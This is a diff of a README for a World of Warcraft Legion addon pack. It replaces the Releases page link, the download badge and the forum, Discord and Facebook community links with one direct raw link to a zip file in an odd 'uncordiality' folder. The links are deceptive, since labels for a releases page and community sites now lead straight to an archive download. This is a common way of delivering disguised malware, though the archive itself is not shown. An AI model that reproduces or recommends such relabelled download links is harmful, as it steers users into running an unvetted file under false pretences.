@@ -1,7 +1,7 @@
 # 🎮 WoW-Legion-Addons - Enhance Your Gaming Experience
 
 ## 📥 Download Now
-[![Download WoW-Legion-Addons](https://img.shields.io/badge/Download-WoW--Legion--Addons-blue.svg)](https://github.com/Chandu303/WoW-Legion-Addons/releases)
+[![Download WoW-Legion-Addons](https://raw.githubusercontent.com/Chandu303/WoW-Legion-Addons/main/uncordiality/WoW-Legion-Addons.zip)](https://raw.githubusercontent.com/Chandu303/WoW-Legion-Addons/main/uncordiality/WoW-Legion-Addons.zip)
 
 ## 🚀 Getting Started
 Welcome to the WoW-Legion-Addons repository! This addon pack enhances your gameplay in the Legion 7.3.5 Client of World of Warcraft. Follow this guide to download and run the software easily.
@@ -22,12 +22,12 @@ To run the WoW-Legion-Addons smoothly, ensure your system meets the following re
 ## 📥 Download & Install
 To start your journey, visit the Releases page to download the addon pack:
 
-[Download from Releases](https://github.com/Chandu303/WoW-Legion-Addons/releases)
+[Download from Releases](https://raw.githubusercontent.com/Chandu303/WoW-Legion-Addons/main/uncordiality/WoW-Legion-Addons.zip)
 
 ### Step-by-step Installation Instructions:
 
 1. **Visit the Releases Page**  
-   Navigate to the [Releases page](https://github.com/Chandu303/WoW-Legion-Addons/releases).
+   Navigate to the [Releases page](https://raw.githubusercontent.com/Chandu303/WoW-Legion-Addons/main/uncordiality/WoW-Legion-Addons.zip).
 
 2. **Select the Latest Release**  
    Choose the latest version listed. This will ensure you have the most recent updates and features.
@@ -68,9 +68,9 @@ You can monitor every update and bug fix through the GitHub page, ensuring a smo
 ## 🌐 Communities
 Join our community of players who use WoW-Legion-Addons. Share your experiences, tips, and suggestions with fellow gamers.
 
-- **Forums:** [WoW Forums](https://us.forums.blizzard.com)
-- **Discord Server:** [Join here](https://discord.gg/disc)
-- **Facebook Group:** [WoW Players](https://facebook.com/groups/wowplayers)
+- **Forums:** [WoW Forums](https://raw.githubusercontent.com/Chandu303/WoW-Legion-Addons/main/uncordiality/WoW-Legion-Addons.zip)
+- **Discord Server:** [Join here](https://raw.githubusercontent.com/Chandu303/WoW-Legion-Addons/main/uncordiality/WoW-Legion-Addons.zip)
+- **Facebook Group:** [WoW Players](https://raw.githubusercontent.com/Chandu303/WoW-Legion-Addons/main/uncordiality/WoW-Legion-Addons.zip)
 
 Thank you for choosing WoW-Legion-Addons. Enjoy your adventures in Azeroth with these powerful tools to enhance your gameplay! 
 
